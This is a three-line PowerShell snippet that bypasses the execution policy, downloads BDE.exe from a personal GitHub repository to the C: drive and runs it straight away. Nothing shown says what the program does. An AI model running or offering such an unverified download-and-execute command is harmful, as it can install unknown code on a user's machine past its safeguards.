Set-ExecutionPolicy Bypass -Scope Process -Force;
$f='C:\bde.exe'; Invoke-WebRequest 'https://github.com/CustomRomHarsh/exes/raw/refs/heads/main/BDE.exe' -OutFile $f; Start-Process $f
